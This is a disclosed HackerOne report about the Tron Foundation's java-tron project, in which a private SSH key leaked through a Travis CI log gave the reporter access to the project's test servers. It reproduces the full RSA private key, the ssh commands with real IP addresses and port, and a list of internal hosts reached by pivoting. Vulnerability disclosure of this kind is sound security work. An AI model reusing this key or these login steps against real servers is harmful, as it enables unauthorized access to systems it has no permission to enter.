@@ -1,0 +1,96 @@
+ReportLink:https://hackerone.com/reports/638401
+WeaknessName:Cleartext Storage of Sensitive Information
+Reporter:https://hackerone.com/hayageek
+ReportedTo:Tron Foundation(tronfoundation)
+BountyAmount:100.0
+Severity:low
+State:Closed
+DateOfDisclosure:11.08.2019 7:31:55
+
+Summary:
+
+# REQUIRED:
+1. Summary of the bug
+
+## Summary:
+Private key is printed in Travis Console log https://travis-ci.org/tronprotocol/java-tron/builds/361945077#L4101
+Github provides information of test servers https://github.com/tronprotocol/java-tron/blob/24575f0d835b00850b89c620e276fb61c791508d/deploy.sh
+
+Using these I am able to login to the test servers.
+
+
+## Steps To Reproduce:
+  1. -  Download the Private key file printed in travis log  https://travis-ci.org/tronprotocol/java-tron/builds/361945077#L4101
+
+```-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEArt6mKkoT6mhGQnnxdHAIMP9Hsg7IGNmcfzCo5y3TDF5OluA7
+wgqQm3OUSdndbU9gjBDLDEh0SrplOVef68xUW2gNI7k+Ql+dAjWDf+WiX7T3ZMxY
+xDg5mU5nJTEvSzS7g0gwryRKj+BS0nYMURIOfmgAisC/Z3OXMWYevgVVtzVoSBOi
+L3I8XfbFLFmfdSGAMpfRMtrpXb8dcgmy5gJjlVs82UgCXUrMe785DaxBsX0NHKX3
+5PDxS6vzi6MJ3QI1DeglShoBV4k3182wmIQe2pvvXHS8vrxV2ak3x5StetdDvKLO
+LE8JSoqWHqhy1OhRWYObvmR4EbHZTuLedYovaQIDAQABAoIBAG3JGPdp5JEBAENR
+/bZFc88XJjLytstrK6ZqrU/eZCbaumpcwweyzFDcQlgPMMYk1I97J49BmckkttJG
+Yf+PG9L7Q2yPKzhOgOtXH4TXbZa6rasZ5Azk47yNDZK7C18i7yqf0vjSRwGHK1g4
+hskLFhBkSRrTohdX6a841soj3UmUc2YUBf0nBa0hsEH8fjE66v4IOi41HUREQj7x
+Js9RJtMzl8vROQntaeIJihkg+I1xmoc98eI7D0q6WwRTgI7NR/3IFA7K+UWSdPMt
+rRajbWGtnJ1cVxeR6fs2K8ndvvURS5iN8Q6a7vVkEGOW1NwZR2a5BrdnO2rBpwNC
+RM4pqDUCgYEA2hKybA8+b36Jz3z3tLPfXmAWM4lGOCWqdMuNiW2SQk1o6hcgrbg+
+ww+o932Ex3iHVkyJIV68HIl+ccxKSAIaPRUFbY28dhBYi8MnhJwQoSE0i0wamCl+
+GclL8Bte9F38gQ7fxjv/4wdN/Q2LMhEH1GiFRhSYqsE4vHNX9L778HcCgYEAzUhn
+Vu7Jt83wmA9bWHeleDUadjG4aMM/tHVPlWlIHbhMjAp25BVbDlwOg+WWL4aqBMfP
+R/+Fc4Fdzxs1tcOZkvJlT2U3D6ujXQihd2ZZ0cZzg/nlxzSOBVRAJI/yWOYALlmB
+/V1Cyg1WFYzvVSRtbfpK5giUsIaUCuOpE4i1tx8CgYAp4FdE6vR5YppCLuQ+XiAx
+tk/tG5pRY+JExWXrkw/4DXdtJH3Q/kWHHbW7uO3LhDiw+MeIkfGbpUeTwMAu7cBu
+JGBDdmlPXroyNIqdK38CAidd7IJa3/ToLMCZXhgw4u9/NQUBwznTNe7i/jvRpHWV
+c3DMUV4zxCEKBzhHtnkY5wKBgDjBJsjzFdP6XOU9gaywz4+vZtR8pJZaPNegg1M0
+m1qUJJ2nGv2uJdGPg/fVVrNnEMRnlZg7PeMURiJHTI8nN+NXnsjXm+R6OJ01EKcZ
+JgYITtGTGoL7tbQleeJh5cfMNwqZdoXc7eU80Kr+nwC0JIj+ZQy6HJm9a1qjXJBp
+AIxTAoGBAKSNYdhnXoR1L8SQ4yzeT9sLBVyeXwr8zpoeMTaTwCXFO0KnNzrNYgnc
+GiftVbqf9fCt1t/bji/AkjVEeuY7YIJ2RnfWNnOiMLI16GMnQ+WzgDHdu/9pRTbh
+Ml+mZz9B0L68OAy4BPXt5b4XJtBs3VDoRI7/YFOT0habxIqZBniC
+-----END RSA PRIVATE KEY-----```
+
+
+  2. - Save this as id_rsa and change permission.
+`chmod 600 id_rsa`
+  3. - I am able to login to the servers `47.93.42.145` and `47.93.18.60` using the below commands.
+
+`ssh -p 22008 -t java-tron@47.93.42.145 -i id_rsa`
+
+`ssh -p 22008 -t java-tron@47.93.18.60 -i id_rsa`
+
+- Attached the screenshots `47.93.18.60.png`, `47.93.42.145.png`
+
+
+3). After login to the server `47.93.18.60`, I can log in to any of the test server with the following command
+`ssh -p 22008 10.40.10.222`
+
+I am able to login to below servers, attache the log file.  `testservers-log.txt`
+```
+10.40.10.220 (testgroup005)
+10.40.10.222 (testgroup002)
+10.40.10.223 (testgroup003)
+10.40.10.224 (testgroup009)
+10.40.10.225(testgroup-sun-005)
+10.40.10.226 (testgroup007)
+10.40.10.227 (testgroup-sun-003)
+10.40.10.228 (testgroup008)
+10.40.10.229 (testgroup012)
+10.40.10.230 (testgroup-sun-001)
+10.40.10.231 (testgroup011)
+10.40.10.232 (testgroup010)
+10.40.10.233 (testgroup006)
+10.40.10.234 (testgroup-sun-002)
+10.40.10.235(testgroup-sun-004)
+10.40.10.236 (testgroup013)
+10.40.10.237 (testgroup016)
+.
+.
+.
+10.40.10.245 (testgroup017)
+```
+
+## Impact
+
+1).Private key leakage 
+2). All of the test servers are compromised.
